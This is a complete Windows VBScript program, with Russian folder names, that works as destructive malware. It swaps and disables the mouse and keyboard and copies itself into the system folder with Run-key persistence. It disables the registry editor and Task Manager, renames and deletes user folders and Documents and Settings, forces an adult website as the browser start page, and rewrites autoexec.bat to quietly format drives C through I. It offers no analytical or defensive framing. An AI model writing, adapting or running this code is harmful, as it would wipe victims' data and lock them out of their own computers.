Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")

Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\SwapNT", "rundll32 user32, SwapMouseButton"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Swap98", "rundll32.exe user.exe, swapmousebutton"
Shell.Run "rundll32 user32, SwapMouseButton"

Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Dead", "rundll32 keyboard,disable"
Shell.Run "rundll32.exe keyboard.exe, disable"

Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Mad", "rundll32 mouse,disable"
Shell.Run "rundll32.exe mouse.exe, disable"

Application.MinimizeAll

Set File2 = FileSystemObject.GetFile(WScript.ScriptFullName)
File2.Copy ("c:\windows\System\Gigabyte.vbs")
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"

Shell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM\DisableRegistryTools", 1, "REG_DWORD"

Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoStartMenuMorePrograms", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoClose", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoFind", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoRun", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoRecentDocsMenu", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoFavoritesMenu", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoStartMenuLogoff", 1, "REG_DWORD"

Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explоrer\NoClose", 1, "REG_DWORD"

For Each Folder In Shell.SpecialFolders
If right(folder,12) = "Рабочий стол" Then 
Set tf = FileSystemObject.getfolder(folder)
Set af = tf.files
For Each fl In af
Set file = FileSystemObject.getfile(fl):t = t+1
file.name = "Bitch" & t
Next
End If
Next

For Each Folder In Shell.SpecialFolders
If right(folder,13) = "Мои документы" Then 
Set tf = FileSystemObject.getfolder(folder)
Set af = tf.files
For Each fl In af
Set file = FileSystemObject.getfile(fl):t = t+1
file.name = "Bitch" & t
Next
End If
Next

For Each Folder In Shell.SpecialFolders
If right(folder,13) = "Мои документы" Then 
Set tf = FileSystemObject.getfolder(folder): tf.name = "Bitch"
End If
Next

For Each Folder In Shell.SpecialFolders
If right(folder,12) = "Главное меню" Then 
Set tf = FileSystemObject.getfolder(folder)
Set af = tf.subfolders
For Each fl In af
Set file = FileSystemObject.getfolder(fl):t = t+1
file.name = "Bitch" & t
Next
End If
Next

InternerExplorer.Visible = True
InternerExplorer.Navigate "http:\\www.waysex.com"

Shell.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http:\\www.waysex.com"

 For Each Folder In Shell.SpecialFolders

 If right(folder,15) = "Aplication Data" Then FileSystemObject.deletefolder folder,True

 If  right(folder,9) = "PrintHood"  Then FileSystemObject.deletefolder folder,True

 If right(folder,8) = "ShellNew" Then FileSystemObject.deletefolder folder,True

 If right(folder,5) = "FONTS" Then FileSystemObject.deletefolder folder,True

 If right(folder,7) = "NetHood" Then FileSystemObject.deletefolder folder,True

 If right(folder,6) = "SendTo" Then FileSystemObject.deletefolder folder,True

 If right(folder,12) = "Автозагрузка" Then FileSystemObject.deletefolder folder,True

 If right(folder,9) = "Избранное" Then FileSystemObject.deletefolder folder,True

 If right(folder,9) = "Программы" Then FileSystemObject.deletefolder folder,True
 Next

 FileSystemObject.deletefolder"C:\Documents and Settings",True
 FileSystemObject.deletefolder"D:\Documents and Settings",True
 FileSystemObject.deletefolder"E:\Documents and Settings",True

Shell.popup "Kiss My Ass!!!! Bitch!!!!!!!!!", , "Текст_заголовка", 0+0

If FileSystemObject.FileExists("d:\autoexec.bat") Then Str  = "d:\autoexec.bat"
If FileSystemObject.FileExists("d:\Windows.000\autoexec.bat") Then Str  = "d:\Windows.000\autoexec.bat"
If FileSystemObject.FileExists("d:\Windows\autoexec.bat") Then Str  = "d:\Windows\autoexec.bat"
If FileSystemObject.FileExists("c:\autoexec.bat") Then Str = "c:\autoexec.bat"
If FileSystemObject.FileExists("c:\Windows.000\autoexec.bat") Then Str = "c:\Windows.000\autoexec.bat"
If FileSystemObject.FileExists("c:\Windows\autoexec.bat") Then Str = "c:\Windows\autoexec.bat"
Set ab = FileSystemObject.GetFile(Str)
ab.Attributes = 0
Set autoexec = FileSystemObject.CreateTextFile(Str)
autoexec.WriteLine "@cls"
autoexec.WriteLine "@format c: /q /autotest"
autoexec.WriteLine "@format d: /q /autotest"
autoexec.WriteLine "@format e: /q /autotest"
autoexec.WriteLine "@format f: /q /autotest"
autoexec.WriteLine "@format g: /q /autotest"
autoexec.WriteLine "@format h: /q /autotest"
autoexec.WriteLine "@format i: /q /autotest"
autoexec.Close
Shell.Run Str, 5
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 67108863, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive", 67108863, "REG_DWORD"